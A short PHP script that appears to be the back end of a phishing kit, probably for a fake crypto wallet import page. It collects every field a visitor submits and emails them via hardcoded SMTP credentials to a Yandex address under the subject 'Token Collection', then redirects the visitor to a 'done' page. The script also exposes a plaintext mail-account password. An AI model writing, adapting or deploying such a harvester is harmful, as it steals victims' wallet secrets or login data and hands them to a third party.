<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';
$content="";
if(isset($_POST['import'])){
    unset($_POST['import']);
}

foreach($_POST as $key=>$value){
    $content.=$key.": ".$value;
}

// passing true in constructor enables exceptions in PHPMailer
$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER; // for detailed debug output
    $mail->isSMTP();
    $mail->Host = 'jasmine.hostnownow.com';
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 465;

    $mail->Username = 'postmaster@pulsexbridge.live'; // YOUR gmail email
    $mail->Password = 'a~{#(Qo?PZM&'; // YOUR gmail password

    // Sender and recipient settings
    $mail->setFrom('postmaster@pulsexbridge.live', 'Postmaster');
    $mail->addAddress('JosephRHopkins@yandex.com', 'Joseph Hopkins');
    $mail->addReplyTo('postmaster@pulsexbridge.live', 'Postmaster'); // to set the reply to

    // Setting the email content
    $mail->IsHTML(true);
    $mail->Subject = 'Token Collection';
    $mail->Body    = $content;
    $mail->send();
    header("Location: done.php");
       exit();
    echo 'Message has been sent';
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
